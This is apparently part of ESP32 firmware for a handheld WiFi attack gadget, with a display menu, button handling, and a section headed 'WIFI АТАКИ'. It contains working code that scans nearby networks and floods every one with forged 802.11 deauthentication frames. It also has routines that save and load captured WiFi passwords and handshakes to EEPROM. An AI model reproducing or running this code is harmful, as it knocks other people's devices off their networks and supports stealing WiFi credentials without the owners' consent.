unsigned long lastBtn = 0;
#define DEBOUNCE 200
bool btn(int pin) {
    if (digitalRead(pin) == LOW && millis() - lastBtn > DEBOUNCE) {
        lastBtn = millis();
        return true;
    }
    return false;
}

void drawTopBar() {
    char buf[10];
    unsigned long sec = (millis() - uptimeStart) / 1000;
    int h = (sec / 3600) % 24, m = (sec / 60) % 60, s = sec % 60;
    snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
    u8g2.setFont(u8g2_font_6x13_tr);
    u8g2.drawStr(2, 9, buf);
    u8g2.drawFrame(114, 1, 12, 6);
    u8g2.drawBox(126, 3, 2, 2);
    u8g2.drawBox(115, 2, 9, 4);
    u8g2.setCursor(55, 9);
    u8g2.print("67%");
    u8g2.setCursor(110, 9);
    u8g2.print(String(lastRSSI) + "dB");
    u8g2.drawLine(0, 10, 128, 10);
}

void showMessage(const char* msg, int delayMs) {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(10, 35, msg);
    u8g2.sendBuffer();
    delay(delayMs);
}

void saveData() {
    EEPROM.begin(EEPROM_SIZE);
    String data = "PASSWORDS:\n" + capturedPasswords + "\nHANDSHAKES:\n" + handshakes;
    for (int i = 0; i < data.length() && i < EEPROM_SIZE; i++) EEPROM.write(i, data[i]);
    EEPROM.write(data.length(), 0);
    EEPROM.commit();
    EEPROM.end();
}
void loadData() {
    EEPROM.begin(EEPROM_SIZE);
    String loaded = "";
    for (int i = 0; i < EEPROM_SIZE; i++) { char c = char(EEPROM.read(i)); if (c == 0) break; loaded += c; }
    int passIdx = loaded.indexOf("PASSWORDS:\n");
    int handIdx = loaded.indexOf("HANDSHAKES:\n");
    if (passIdx != -1) capturedPasswords = loaded.substring(passIdx + 11, handIdx);
    if (handIdx != -1) handshakes = loaded.substring(handIdx + 11);
    EEPROM.end();
}
void clearData() { capturedPasswords = ""; handshakes = ""; saveData(); showMessage("Data cleared", 1000); }
void reboot() { showMessage("Rebooting...", 500); delay(500); ESP.restart(); }

// ==================== WIFI АТАКИ ====================
void scanWiFi() {
    showMessage("SCANNING...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    networkCount = WiFi.scanNetworks();
    if (networkCount > 50) networkCount = 50;
    for (int i = 0; i < networkCount; i++) {
        networkNames[i] = WiFi.SSID(i);
        networkChannel[i] = WiFi.channel(i);
        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
    }
    char buf[32];
    sprintf(buf, "FOUND: %d", networkCount);
    showMessage(buf, 1500);
    WiFi.mode(WIFI_AP_STA);
}

void sendDeauthPacket(uint8_t* bssid, uint8_t* client) {
    uint8_t packet[] = {0xC0,0x00,0x00,0x00,client[0],client[1],client[2],client[3],client[4],client[5],bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],0x00,0x00,0x07,0x00};
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    deauthPackets++;
}

void startDeauth() {
    if (networkCount == 0) { showMessage("SCAN FIRST!", 1000); return; }
    deauthActive = true;
    deauthPackets = 0;
    showMessage("DEAUTH ACTIVE", 1000);
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (deauthActive) {
        for (int i = 0; i < networkCount && deauthActive; i++) {
            sendDeauthPacket(networkBSSID[i], broadcast);
        }
        if (btn(BTN_BACK)) deauthActive = false;
        delay(50);
    }
    showMessage("DEAUTH STOPPED", 1000);
}
void stopDeauth() { deauthActive = false; }

